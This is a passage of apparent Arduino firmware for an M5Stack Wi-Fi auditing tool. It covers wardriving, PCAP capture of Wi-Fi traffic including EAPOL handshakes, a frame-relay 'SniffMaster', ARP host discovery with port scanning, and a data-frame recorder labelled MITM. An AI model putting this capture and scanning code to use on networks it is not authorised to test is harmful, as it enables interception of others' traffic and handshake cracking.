    M5.Display.print("Lat: ");
    M5.Display.println(gps.location.lat(), 8);
    y += lineHeight + spacing;

    M5.Display.setCursor(0, y);
    M5.Display.print("Lon: ");
    M5.Display.println(gps.location.lng(), 8);
    y += lineHeight + spacing;

    M5.Display.setCursor(0, y);
    M5.Display.print("Altitude: ");
    M5.Display.println(gps.altitude.meters());
    y += lineHeight + spacing;

    M5.Display.setCursor(0, y);
    M5.Display.print("HDOP: ");
    M5.Display.println(gps.hdop.value());
    y += lineHeight + spacing;

    M5.Display.display();  // Refresh the display to show changes

    // Update the last display time
    lastDisplayTime = millis();
  }
}


void loopwardrivingmaster() {
  // First, handle key presses for navigating between screens
  // Make sure to update the M5Core2 state
  M5.update();  // Update M5Stack system state

  if (M5.BtnA.isPressed()) {
    currentScreen = 1;  // Switch to the general information screen
  } else if (M5.BtnC.isPressed()) {
    currentScreen = 2;  // Switch to the received data screen
  }

  // Now display the appropriate screen based on the current state
  if (currentScreen == 1) {
    displayGeneralInfo();  // Show screen 1 with general info
  } else if (currentScreen == 2) {
    displayReceivedData();  // Show screen 2 with received data
  }

  // Shorter smart delay to check buttons more frequently
  smartDelay(1000);  // Reduce smartDelay to a smaller time to improve response
}

// If smartDelay already exists, don't redefine it
void smartDelay(unsigned long ms) {
  unsigned long start = millis();
  do {
    while (Serial2.available())
      gps.encode(Serial2.read());  // Read GPS data during the delay
    // Check buttons during the delay to improve responsiveness
    M5.update();

  } while (millis() - start < ms);
}

// Function to stop ESP-NOW when exiting Wardriving Master mode
void stopEspNow() {
  esp_now_unregister_recv_cb();  // Unregister the receive callback to stop processing ESP-NOW messages
  Serial.println("ESP-NOW receiving process stopped.");
}


void startWardivingMaster() {
  Serial.println("Entering Wardriving Master mode...");
  WiFi.mode(WIFI_STA);

  if (esp_now_init() != 0) {
    Serial.println("Error initializing ESP-NOW");
    return;
  }

  esp_now_register_recv_cb(OnDataRecv);
  updateFileName();
  printHeader();

  while (true) {
    loopwardrivingmaster();
    M5.update();
    if (M5.BtnB.isPressed()) {
      Serial.println("Exiting Wardriving Master mode...");
      stopEspNow();  // Stop ESP-NOW before returning to the menu
      waitAndReturnToMenu("Returning to menu...");
      break;
    }
  }
}



// Maximum size of a Wi-Fi frame
#define MAX_FRAME_SIZE 2346
#define ESPNOW_MAX_DATA_LEN 250  // Maximum size of ESP-NOW data
const uint16_t MAX_FRAGMENT_SIZE = ESPNOW_MAX_DATA_LEN - sizeof(uint16_t) - sizeof(uint8_t) - sizeof(bool) - sizeof(uint8_t);

// Structure for frame fragments (must match exactly with the slave)
typedef struct {
  uint16_t frame_len;         // Length of the fragment
  uint8_t fragment_number;    // Fragment number
  bool last_fragment;         // Indicates if this is the last fragment
  uint8_t boardID;            // ID of the ESP32 sending the frame
  uint8_t frame[MAX_FRAGMENT_SIZE];  // Fragment of the frame
} wifi_frame_fragment_t;

uint8_t wifiFrameBuffer[14][MAX_FRAME_SIZE];  // Buffer to reconstruct frames for each ESP32
uint16_t received_len[14] = {0};              // Total length received for each ESP32
uint8_t expected_fragment_number[14] = {0};   // Expected fragment number for each ESP32
int received_frames[14] = {0};                // Frame count received for each ESP32
bool exitSniffMaster = false;                 // Variable to manage the exit

// Function to initialize a PCAP file with an incremented name
void initPCAP() {
  // Create the /handshakes folder if it does not exist
  if (!SD.exists("/handshakes")) {
    SD.mkdir("/handshakes");
  }

  // Find the next available file number
  int fileIndex = 0;
  String fileName;
  do {
    fileName = "/handshakes/masterSniffer_" + String(fileIndex, HEX) + ".pcap";
    fileIndex++;
  } while (SD.exists(fileName));

  // Open the file with the incremented name
  pcapFile = SD.open(fileName, FILE_WRITE);
  if (pcapFile) {
    const uint8_t pcapGlobalHeader[24] = {
      0xd4, 0xc3, 0xb2, 0xa1,  // Magic Number
      0x02, 0x00, 0x04, 0x00,  // Version 2.4
      0x00, 0x00, 0x00, 0x00,  // Timezone correction
      0x00, 0x00, 0x00, 0x00,  // Timestamp accuracy
      0xff, 0xff, 0x00, 0x00,  // SnapLen (maximum packet size)
      0x69, 0x00, 0x00, 0x00   // LinkType (Wi-Fi)
    };
    pcapFile.write(pcapGlobalHeader, sizeof(pcapGlobalHeader));
    pcapFile.flush();
    Serial.printf("PCAP file initialized: %s\n", fileName.c_str());
  } else {
    Serial.println("Unable to create the PCAP file");
  }
}

// Function to add a complete frame to the PCAP file
void saveToPCAP(const uint8_t *data, int data_len) {
  if (pcapFile) {
    uint32_t ts_sec = millis() / 1000;
    uint32_t ts_usec = (millis() % 1000) * 1000;
    uint32_t incl_len = data_len;
    uint32_t orig_len = data_len;

    pcapFile.write((uint8_t*)&ts_sec, sizeof(ts_sec));
    pcapFile.write((uint8_t*)&ts_usec, sizeof(ts_usec));
    pcapFile.write((uint8_t*)&incl_len, sizeof(incl_len));
    pcapFile.write((uint8_t*)&orig_len, sizeof(orig_len));
    pcapFile.write(data, data_len);
    pcapFile.flush();
    Serial.printf("Frame of %d bytes saved to the PCAP file\n", data_len);
  }
}

// Callback function to reassemble fragmented frames received via ESP-NOW
void OnDataRecvSniffer(const uint8_t *mac, const uint8_t *incomingData, int len) {
  wifi_frame_fragment_t *receivedFragment = (wifi_frame_fragment_t*)incomingData;

  // Verify the size of the received fragment
  if (len < sizeof(wifi_frame_fragment_t) - MAX_FRAGMENT_SIZE + receivedFragment->frame_len) {
    Serial.println("Incorrect fragment size, fragment ignored");
    return;
  }

  // Get the boardID of the ESP32 that sent the frame
  uint8_t boardID = receivedFragment->boardID;
  if (boardID < 1 || boardID > 14) {
    Serial.println("Invalid ESP32 ID");
    return;
  }

  // Verify the expected fragment number for this ESP32
  if (receivedFragment->fragment_number != expected_fragment_number[boardID - 1]) {
    Serial.println("Unexpected fragment number, resetting for this ESP32");
    received_len[boardID - 1] = 0;
    expected_fragment_number[boardID - 1] = 0;
    return;
  }

  // Copy the fragment into the buffer for this ESP32
  memcpy(wifiFrameBuffer[boardID - 1] + received_len[boardID - 1], receivedFragment->frame, receivedFragment->frame_len);
  received_len[boardID - 1] += receivedFragment->frame_len;
  expected_fragment_number[boardID - 1]++;

  // If it's the last fragment, process the complete frame
  if (receivedFragment->last_fragment) {
    Serial.printf("Complete frame received from ESP32 %d : %d bytes\n", boardID, received_len[boardID - 1]);
    saveToPCAP(wifiFrameBuffer[boardID - 1], received_len[boardID - 1]);
    received_frames[boardID - 1]++;
    displayStatus();  // Update display after receiving a frame
    // Reset counters for this ESP32
    received_len[boardID - 1] = 0;
    expected_fragment_number[boardID - 1] = 0;
  }
}

int lastTotalReceived = -1;  // Stocke l'ancien total des trames reçues
int lastReceivedFrames[14] = {0};  // Stocke les anciennes valeurs pour chaque boardID

void displayStatus() {
  // Dimensions de l'écran et de la zone dédiée au total
  const int displayWidth = 320;
  const int displayHeight = 240;
  const int totalAreaHeight = 20;  // Hauteur réservée pour l'affichage du total

  // Calculer le total des trames reçues
  int totalReceived = 0;
  for (int i = 0; i < 14; i++) {
    totalReceived += received_frames[i];
  }

  // Mettre à jour uniquement si le total a changé
  if (totalReceived != lastTotalReceived) {
    // Effacer la zone du total sur toute la largeur de l'écran
    M5.Display.fillRect(0, 0, displayWidth, totalAreaHeight, menuBackgroundColor);
    M5.Display.setTextSize(2);
    M5.Display.setCursor(0, 0);  // Position du texte en haut
    M5.Display.setTextColor(menuTextUnFocusedColor,menuBackgroundColor);//here
    M5.Display.printf("Total Frames: %d", totalReceived);  // Afficher le nouveau total
    lastTotalReceived = totalReceived;
  }

  // Préparer l'affichage de la grille 2 colonnes x 7 lignes
  int cellWidth = displayWidth / 2;              // Largeur d'une case (320 / 2 = 160)
  int cellHeight = (displayHeight - totalAreaHeight) / 7;  // Hauteur d'une case (par ex. (240-20)/7 ≈ 31)
  int marginY = totalAreaHeight;                 // La grille démarre juste après la zone du total

  M5.Display.setTextSize(2);  // Taille de texte pour les cases
  for (int i = 0; i < 14; i++) {
    // Mettre à jour uniquement si le nombre de trames reçues a changé pour cette case
    if (received_frames[i] != lastReceivedFrames[i]) {
      int col = i % 2;       // Colonne (0 ou 1)
      int row = i / 2;       // Ligne (0 à 6)

      // Calcul des positions X et Y de la case
      int posX = col * cellWidth;
      int posY = marginY + row * cellHeight;

      // Effacer la case avant de redessiner
      M5.Display.fillRect(posX, posY, cellWidth, cellHeight, menuBackgroundColor);

      // Dessiner le rectangle de la case
      M5.Display.drawRect(posX, posY, cellWidth, cellHeight, menuTextFocusedColor);

      // Créer le texte à afficher (exemple : "CH 1: 123")
      String text = "CH " + String(i + 1) + ": " + String(received_frames[i]);

      // Calculer la largeur du texte pour le centrer
      int textWidth = M5.Display.textWidth(text);

      // Calcul du centrage horizontal et vertical (8 correspond à la hauteur approximative de la police)
      int textX = posX + (cellWidth - textWidth) / 2;
      int textY = posY + (cellHeight - 8) / 2;

      // Afficher le texte centré dans la case
      M5.Display.setCursor(textX, textY);
      M5.Display.print(text);

      // Mettre à jour la dernière valeur affichée pour cette case
      lastReceivedFrames[i] = received_frames[i];
    }
  }

  M5.Display.display();  // Rafraîchir l'affichage
}


void sniffMaster() {
  Serial.println("Initializing SniffMaster mode...");
  exitSniffMaster = false;  // Reset the exit flag
  M5.Display.clear();

  // Reset the arrays and variables
  memset(received_len, 0, sizeof(received_len));
  memset(expected_fragment_number, 0, sizeof(expected_fragment_number));
  memset(received_frames, 0, sizeof(received_frames));
  memset(wifiFrameBuffer, 0, sizeof(wifiFrameBuffer));

  // Initialize the SD card
  if (!SD.begin()) {
    Serial.println("SD card initialization failed");
    return;
  } else {
    Serial.println("SD card initialized successfully");
  }

  initPCAP();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  if (esp_now_init() != ESP_OK) {
    Serial.println("ESP-NOW initialization failed");
    return;
  } else {
    Serial.println("ESP-NOW initialized successfully");
  }

  if (esp_now_register_recv_cb(OnDataRecvSniffer) != ESP_OK) {
    Serial.println("Error registering the ESP-NOW callback");
    return;
  } else {
    Serial.println("ESP-NOW callback registered successfully");
  }

  displayStatus();  // Display the initial status
  enterDebounce();
  while (!exitSniffMaster) {
    M5.update();
    handleDnsRequestSerial();  // Background tasks

    // Key handling to stop sniffing
    if (M5.BtnB.isPressed()) {
      stopSniffMaster();
    }
  }
}

void stopSniffMaster() {
  esp_now_unregister_recv_cb();  // Stop receiving ESP-NOW data
  esp_now_deinit();  // Deinitialize ESP-NOW
  if (pcapFile) {
    pcapFile.close();
  }
  exitSniffMaster = true;  // Signal the exit to the main mode
  waitAndReturnToMenu("Returning to menu...");
}


void wifiVisualizer() {
  bool inVisualizer = true;

  const int screenWidth = 320;
  const int screenHeight = 240;
  const int maxChannels = 13;
  const int leftMargin = 30;
  const int rightMargin = 10;
  const int chartWidth = screenWidth - leftMargin - rightMargin;
  const int spacing = 4;

  const int barWidth = (chartWidth - (spacing * (maxChannels - 1))) / maxChannels;
  const int chartHeight = screenHeight - 50;



  M5.Display.clear(menuBackgroundColor);
  M5.Display.setTextSize(2);
  M5.Display.setTextFont(1);
  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  M5.Display.setCursor(screenWidth / 2 - 60, screenHeight / 2 - 10);
  M5.Display.printf("Scanning...");
  M5.Display.display();

  static int colors[] = {TFT_WHITE, TFT_RED, TFT_PINK, TFT_ORANGE, TFT_YELLOW, TFT_GREENYELLOW, TFT_GREEN, TFT_DARKGREEN, TFT_CYAN, TFT_BLUE, TFT_NAVY, TFT_PURPLE, TFT_MAROON, TFT_MAGENTA};

  for (int i = 0; i <= 5; i++) {
    int yPosition = chartHeight - (i * chartHeight / 5) + 15;
    M5.Display.drawLine(leftMargin - 8, yPosition, leftMargin, yPosition, menuSelectedBackgroundColor);
    M5.Display.setCursor(2, yPosition - 10);
    int scaleValue = (5 * i);
    M5.Display.printf("%d", scaleValue);
  }
  for (int i = 1; i <= maxChannels; i++) {
    int xPosition = leftMargin + (i - 1) * (barWidth + spacing);
    M5.Display.setCursor(xPosition + (barWidth / 2) - 6, screenHeight - 20);
    M5.Display.setTextColor(colors[i + 1], menuBackgroundColor);
    M5.Display.printf("%d", i);
  }
  M5.Display.display();

  WiFi.mode(WIFI_STA);
  WiFi.scanNetworks(true);
  bool scanInProgress = true;
  
  enterDebounce();
  while (M5.BtnB.isPressed()) {
        M5.update();
    delay(100);
  }
  while (!M5.BtnB.isPressed()) {
    M5.update();

    int n = WiFi.scanComplete();
    if (n >= 0) {
      scanInProgress = false;

      int channels[maxChannels + 1] = {0};

      if (n == 0) {
        Serial.println("Aucun réseau WiFi trouvé.");
      } else {
        for (int i = 0; i < n; i++) {
          int channel = WiFi.channel(i);
          if (channel >= 1 && channel <= maxChannels) {
            channels[channel]++;
          }
        }
      }

      WiFi.scanDelete();

      int maxCount = 1;
      for (int i = 1; i <= maxChannels; i++) {
        if (channels[i] > maxCount) {
          maxCount = channels[i];
        }
      }

      int scaleMax = ((maxCount + 4) / 5) * 5;
      if (scaleMax < 5) scaleMax = 5;

      M5.Display.clear(menuBackgroundColor);
      M5.Display.setTextSize(2);
      M5.Display.setTextFont(1);

      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
      for (int i = 0; i <= 5; i++) {
        int yPosition = chartHeight - (i * chartHeight / 5) + 15;
        M5.Display.drawLine(leftMargin - 8, yPosition, screenWidth - 10, yPosition, menuSelectedBackgroundColor);
        M5.Display.setCursor(2, yPosition - 10);
        int scaleValue = (scaleMax * i) / 5;
        M5.Display.printf("%d", scaleValue);
      }

      for (int i = 1; i <= maxChannels; i++) {
        int barHeight = map(channels[i], 0, scaleMax, 0, chartHeight);
        int xPosition = leftMargin + (i - 1) * (barWidth + spacing);

        int amount = 100;
        uint8_t r = (colors[i] >> 11) & 0x1F;  // Extract the 5 most significant (red) bits
        uint8_t g = (colors[i] >> 5) & 0x3F;   // Extract the 6 middle (green) bits
        uint8_t b = colors[i] & 0x1F;          // Extract the 5 least significant (blue) bits

        // Convert 5-6-5 format to 8-bit depth to manipulate
        uint8_t red = (r * 255) / 31;
        uint8_t green = (g * 255) / 63;
        uint8_t blue = (b * 255) / 31;

        // Decrease by 'amount' with underflow protection
        red = (red > amount) ? (red - amount) : 0;
        green = (green > amount) ? (green - amount) : 0;
        blue = (blue > amount) ? (blue - amount) : 0;

        // Convert back to 5-6-5 format from 8-bit colors
        r = (red * 31) / 255;
        g = (green * 63) / 255;
        b = (blue * 31) / 255;

        // Recompose the color
        uint16_t shadowColor = (r << 11) | (g << 5) | b;
        uint16_t barColor = colors[i];

        M5.Display.fillRect(xPosition, screenHeight - barHeight - 30, barWidth, barHeight, barColor);

        M5.Display.fillTriangle(
          xPosition + barWidth, screenHeight - barHeight - 30,
          xPosition + barWidth + 4, screenHeight - barHeight - 34,
          xPosition + barWidth + 4, screenHeight - 30, shadowColor
        );

        M5.Display.drawRect(xPosition, screenHeight - barHeight - 30, barWidth, barHeight, colors[i]);

        M5.Display.setCursor(xPosition + (barWidth / 2) - 6, screenHeight - 20);
        M5.Display.setTextColor(colors[i], menuBackgroundColor);
        M5.Display.printf("%d", i);
      }

      M5.Display.display();

      WiFi.scanNetworks(true);
      scanInProgress = true;
    }
  }

  inMenu = true;
  drawMenu();
}



typedef struct snifferAll_pcap_hdr_s {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
} snifferAll_pcap_hdr_t;

typedef struct snifferAll_pcaprec_hdr_s {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
} snifferAll_pcaprec_hdr_t;

int allSniffCount = 0;
int beaconCount = 0;
int eapolCount = 0;
int probeReqCount = 0;
int probeRespCount = 0;
int deauthCountSniff = 0;
int packetSavedCount = 0;

bool isPaused = false;
bool cursorVisible = true;

File sniffFile;

void writePCAPHeader_snifferAll(File &file) {
  Serial.println("Writing PCAP header to the file...");
  snifferAll_pcap_hdr_t pcap_header;
  pcap_header.magic_number = 0xa1b2c3d4;
  pcap_header.version_major = 2;
  pcap_header.version_minor = 4;
  pcap_header.thiszone = 0;
  pcap_header.sigfigs = 0;
  pcap_header.snaplen = 65535;
  pcap_header.network = 105;

  file.write((const uint8_t*)&pcap_header, sizeof(snifferAll_pcap_hdr_t));
  file.flush();
  Serial.println("PCAP header written.");
}
void recordPacketToPCAPFile_snifferAll(const wifi_promiscuous_pkt_t* packet) {
  if (!sniffFile || isPaused) {
    Serial.println("Capture file not open or sniffing is paused, packet not recorded.");
    return;
  }
  uint16_t sig_len = packet->rx_ctrl.sig_len;

  const uint8_t *frame = packet->payload;
  uint16_t frameControl = (frame[1] << 8) | frame[0];
  uint8_t frameType = (frameControl >> 2) & 0x03; // Extraction des bits 2-3 pour le type
  uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  if (frameSubType == 0x08 || frameSubType == 0x04 || frameSubType == 0x05 ||
      frameSubType == 0x0D || frameSubType == 0x0B || frameSubType == 0x0C) {
    sig_len -= 4;
  }

  Serial.println("Recording a packet to the PCAP file...");
  snifferAll_pcaprec_hdr_t pcap_packet_header;
  pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 1000000;
  pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 1000000;
  pcap_packet_header.incl_len = sig_len;
  pcap_packet_header.orig_len = sig_len;

  sniffFile.write((const uint8_t*)&pcap_packet_header, sizeof(snifferAll_pcaprec_hdr_t));
  sniffFile.write(packet->payload, sig_len);
  sniffFile.flush();

  // Vérification si c'est une trame EAPOL
  if (estUnPaquetEAPOL(packet)) {
    eapolCount++;
    Serial.printf("EAPOL packet recorded. Number of EAPOL: %d\n", eapolCount);
  } else if (frameType == 0) { // Vérification si c'est une trame de Management
    switch (frameSubType) {
      case 0x08: // Beacon
        beaconCount++;
        Serial.printf("Beacon packet recorded. Number of Beacons: %d\n", beaconCount);
        break;
      case 0x04: // Probe Request
        probeReqCount++;
        Serial.printf("Probe Request packet recorded. Number of Probe Requests: %d\n", probeReqCount);
        break;
      case 0x05: // Probe Response
        probeRespCount++;
        Serial.printf("Probe Response packet recorded. Number of Probe Responses: %d\n", probeRespCount);
        break;
      case 0x0C: // Deauthentication
        deauthCountSniff++;
        Serial.printf("Deauthentication packet recorded. Number of Deauthentications: %d\n", deauthCountSniff);
        break;
      default:
        Serial.println("Unrecognized Management packet type recorded.");
        break;
    }
  } else {
    Serial.println("Non-EAPOL, non-Management packet recorded.");
  }

  packetSavedCount++;
  Serial.printf("Packet recorded. Total number of packets saved: %d\n", packetSavedCount);
}


void allTrafficCallback_snifferAll(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  recordPacketToPCAPFile_snifferAll(pkt);
}

void findNextAvailableFileID() {
  Serial.println("Searching for the next available file ID...");
  allSniffCount = 0;
  File root = SD.open("/sniffer");
  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String filename = file.name();
      if (filename.startsWith("RawSniff_")) {
        int fileID = strtol(filename.substring(9, 11).c_str(), nullptr, 16);
        if (fileID >= allSniffCount) {
          allSniffCount = fileID + 1;
        }
      }
    }
  }
  root.close();
  Serial.printf("Next available file ID: %02X\n", allSniffCount);
}

void allTrafficSniffer() {
  // Reset counters
  beaconCount = 0;
  eapolCount = 0;
  probeReqCount = 0;
  probeRespCount = 0;
  deauthCountSniff = 0;
  packetSavedCount = 0;

  Serial.println("Resetting packet counters...");
  enterDebounce();
  // Check available file ID on SD card
  if (!SD.exists("/sniffer") && !SD.mkdir("/sniffer")) {
    Serial.println("Unable to create /sniffer directory");
    return;
  }
  findNextAvailableFileID();

  // Create a filename for the next capture
  char filename[50];
  sprintf(filename, "/sniffer/RawSniff_%02X.pcap", allSniffCount);

  // Open the file for writing
  Serial.printf("Opening capture file: %s\n", filename);
  sniffFile = SD.open(filename, FILE_WRITE);
  if (!sniffFile) {
    Serial.println("Failed to open capture file for writing");
    return;
  }
  writePCAPHeader_snifferAll(sniffFile);

  // Set up WiFi in promiscuous mode
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(allTrafficCallback_snifferAll);

  Serial.println("Starting all traffic sniffer...");
  M5.Lcd.clear();
  M5.Lcd.setTextColor(menuTextFocusedColor);
  M5.Lcd.setCursor(3, 0);
  M5.Lcd.println("Sniffing Raw on :");
  M5.Lcd.println(filename);

  bool exitSniff = false;
  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 300;
  unsigned long lastCursorBlinkTime = 0;
  while (!exitSniff) {
    esp_task_wdt_reset();
    vTaskDelay(pdMS_TO_TICKS(10));
    M5.update();
    handleDnsRequestSerial();
    unsigned long currentPressTime = millis();
    unsigned long currentTime = millis();

    M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Lcd.setCursor(0, 45);
    M5.Lcd.printf("     < [Channel]: %d > \n", currentChannel);
    M5.Lcd.setCursor(0, 62);
    M5.Lcd.printf("[Beacon]      : %d\n", beaconCount);
    M5.Lcd.printf("[EAPOL]       : %d\n", eapolCount);
    M5.Lcd.printf("[Deauth]      : %d\n", deauthCountSniff);
    M5.Lcd.printf("[ProbeReq]    : %d\n", probeReqCount);
    M5.Lcd.printf("[ProbeResp]   : %d\n", probeRespCount);
    M5.Lcd.printf("[Total]       : %d\n", packetSavedCount);
    M5.Lcd.setCursor(0, M5.Display.height() - 16);

    // Cursor blinking every second
    if (currentTime - lastCursorBlinkTime >= 1000) {
      cursorVisible = !cursorVisible;
      lastCursorBlinkTime = currentTime;
    }
    M5.Lcd.setTextColor(menuTextFocusedColor, TFT_BLACK);
    M5.Lcd.printf(cursorVisible ? ">_" : "> ");

    // Show pause indicator
    if (isPaused) {
      M5.Lcd.setCursor(M5.Lcd.width() - 70, M5.Lcd.height() - 12);
      M5.Lcd.setTextColor(WHITE, RED);
      M5.Lcd.print(" PAUSE ");
    } else {
      M5.Lcd.setCursor(M5.Lcd.width() - 80, M5.Lcd.height() - 12);
      M5.Lcd.setTextColor(menuTextFocusedColor, TFT_BLACK);
      M5.Lcd.print("        ");
    }

    // Channel change detection
    if (M5.BtnA.wasPressed() && currentPressTime - lastKeyPressTime > debounceDelay) {
      lastKeyPressTime = currentPressTime;
      currentChannel = (currentChannel > 1) ? currentChannel - 1 : 14;
      esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
      Serial.printf("Channel decreased, now on: %d\n", currentChannel);
    }
    if (M5.BtnC.wasPressed() && currentPressTime - lastKeyPressTime > debounceDelay) {
      lastKeyPressTime = currentPressTime;
      currentChannel = (currentChannel < 14) ? currentChannel + 1 : 1;
      esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
      Serial.printf("Channel increased, now on: %d\n", currentChannel);
    }

    // Exit key detection
    if ((M5.BtnB.wasPressed()) && currentPressTime - lastKeyPressTime > debounceDelay) {
      exitSniff = true;
      lastKeyPressTime = currentPressTime;
      Serial.println("Exit key detected, stopping sniffer...");
    }
  }

  // Clean up WiFi promiscuous mode
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);

  // Close the file
  sniffFile.close();
  Serial.println("Stopped all traffic sniffer, file closed.");
  waitAndReturnToMenu("Stopping Sniffing...");
}

#include <lwip/sockets.h>


// Global variables
File scanFile;
String scanFolder = "/NetworkScan";

// Function to get the next file index
int getNextFileIndex() {
    if (!SD.exists(scanFolder)) {
        SD.mkdir(scanFolder);  // Create the folder if it doesn't exist
    }

    File root = SD.open(scanFolder);
    int maxIndex = -1;
    while (File file = root.openNextFile()) {
        String fileName = file.name();
        if (fileName.endsWith(".txt")) {
            // Extract the index number from the file name
            int currentIndex = fileName.substring(fileName.lastIndexOf('/') + 1, fileName.lastIndexOf('.')).toInt();
            if (currentIndex > maxIndex) {
                maxIndex = currentIndex;
            }
        }
        file.close();
    }
    root.close();
    return maxIndex + 1;  // Return the next file index
}

// Function to log scan results to the file progressively
void logScanResult(String result) {
    if (!scanFile) {
        int fileIndex = getNextFileIndex();
        String filePath = scanFolder + "/" + String(fileIndex) + ".txt";  // Create a new file path with the next index
        scanFile = SD.open(filePath, FILE_WRITE);  // Open the file for writing
        if (!scanFile) {
            M5.Display.println("Failed to create scan file.");
            return;
        }
    }
    scanFile.println(result);  // Write the scan result to the file
    scanFile.flush();  // Ensure the data is written to the file
}


// Mise à jour de la fonction FullNetworkAnalysis pour passer l'index du scan
void FullNetworkAnalysis(bool isWebCommand) {
    // Check WiFi connection
    if (WiFi.localIP().toString() == "0.0.0.0") {
        waitAndReturnToMenu("Not connected...");
        return;
    }

    enterDebounce();

    IPAddress gatewayIP;
    IPAddress subnetMask;
    std::vector<IPAddress> hostslist;

    // Initial display configuration
    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Display.setTextSize(1.5);

    gatewayIP = WiFi.gatewayIP();
    subnetMask = WiFi.subnetMask();

    IPAddress network = WiFi.localIP();
    network[3] = 0;  // Use the base network address
    M5.Display.clear();
    int numHosts = 254 - subnetMask[3];  // Calculate the number of hosts
    M5.Display.setCursor(0, M5.Display.height() / 2);
    M5.Display.println("Probing " + String(numHosts) + " hosts with ARP");
    M5.Display.println("       please wait...");

    bool foundHosts = false;

    // Prepare the base IP address for ARP requests
    char base_ip[16];
    sprintf(base_ip, "%d.%d.%d.", network[0], network[1], network[2]);

    // Send ARP requests across the network
    send_arp(base_ip, hostslist);

    // Read the ARP table to detect active hosts
    read_arp_table(base_ip, 1, numHosts, hostslist);

    // Scan through the ARP table and log results
    for (int i = 1; i <= numHosts; i++) {
        IPAddress currentIP = network;
        currentIP[3] = i;

        if (arpRequest(currentIP)) {
            hostslist.push_back(currentIP);
            foundHosts = true;
            logScanResult("Host : " + currentIP.toString());  // Log each found host
        }
    }

    if (!foundHosts) {
        M5.Display.println("No hosts found.");
        delay(2000);
        waitAndReturnToMenu("No hosts found.");
        return;
    } else {
        logScanResult("-----------------------");
    }

    // Display the number of found hosts
    M5.Display.clear();
    M5.Display.setCursor(M5.Display.width() / 2 - 60, M5.Display.height() / 2);
    M5.Display.println(String(hostslist.size()) + " hosts found");
    delay(2000);

    // Scrolling display of the hosts and scanning their ports
    int scanIndex = getNextFileIndex();
    displayHostsAndScanPorts(hostslist, scanIndex, isWebCommand);

    // Close the scan file after the scan is done
    if (scanFile) {
        scanFile.close();
        M5.Display.println("Scan results saved successfully.");
    }
}

bool connectWithTimeout(WiFiClient& client, IPAddress ip, uint16_t port, uint32_t timeout_ms) {
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0) {
    return false;
  }

  struct sockaddr_in server;
  server.sin_family = AF_INET;
  server.sin_port = htons(port);
  server.sin_addr.s_addr = ip;

  int flags = fcntl(sock, F_GETFL, 0);
  fcntl(sock, F_SETFL, flags | O_NONBLOCK);

  int res = connect(sock, (struct sockaddr*)&server, sizeof(server));
  if (res < 0) {
    if (errno != EINPROGRESS) {
      close(sock);
      return false;
    }
  }

  fd_set fdset;
  FD_ZERO(&fdset);
  FD_SET(sock, &fdset);
  struct timeval tv;
  tv.tv_sec = timeout_ms / 1000;
  tv.tv_usec = (timeout_ms % 1000) * 1000;

  res = select(sock + 1, NULL, &fdset, NULL, &tv);
  if (res <= 0) {
    close(sock);
    return false;
  }

  int so_error;
  socklen_t len = sizeof(so_error);
  getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
  if (so_error != 0) {
    close(sock);
    return false;
  }

  client = WiFiClient(sock);
  return true;
}



void recordPacketToPCAPFile_MITM(const wifi_promiscuous_pkt_t* packet) {
  if (!sniffFile || isPaused) {
    Serial.println("Capture file not open or sniffing is paused, packet not recorded.");
    return;
  }

  uint16_t sig_len = packet->rx_ctrl.sig_len;
  const uint8_t *frame = packet->payload;

  uint16_t frameControl = (frame[1] << 8) | frame[0];
  uint8_t frameType = (frameControl & 0x0C) >> 2;
  uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  bool toDS = frameControl & (1 << 8);
  bool fromDS = frameControl & (1 << 9);

  if (frameType != 0x02) {
    return;
  }

  if (frameSubType == 0x4 || frameSubType == 0xC) {
    size_t header_length = 24;
    if (frameSubType & 0x08) {
      header_length += 2;
    }
    if (frameControl & 0x8000) {
      header_length += 4;
    }
    size_t total_header_length = header_length + 4;

    if (sig_len <= total_header_length) {
      return;
    }
  }

  uint8_t da[6];
  if (toDS && fromDS) {
    memcpy(da, frame + 24, 6);
  } else if (toDS && !fromDS) {
    memcpy(da, frame + 16, 6);
  } else {
    memcpy(da, frame + 4, 6);
  }

  bool isIPv4Multicast = (da[0] == 0x01) && (da[1] == 0x00) && (da[2] == 0x5e) && ((da[3] & 0x80) == 0x00);
  bool isIPv6Multicast = (da[0] == 0x33) && (da[1] == 0x33);

  if (isIPv4Multicast || isIPv6Multicast) {
    return;
  }

  Serial.println("Recording a packet to the PCAP file...");

  snifferAll_pcaprec_hdr_t pcap_packet_header;
  pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 1000000;
  pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 1000000;
  pcap_packet_header.incl_len = sig_len;
  pcap_packet_header.orig_len = sig_len;

  sniffFile.write((const uint8_t*)&pcap_packet_header, sizeof(snifferAll_pcaprec_hdr_t));
  sniffFile.write(packet->payload, sig_len);
  sniffFile.flush();

  packetSavedCount++;
}

void findNextAvailableFileIDClient() {
  Serial.println("Searching for the next available file ID...");
  allSniffCount = 0;
  File root = SD.open("/sniffer");
  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String filename = file.name();
      if (filename.startsWith("ClientSniff_")) {
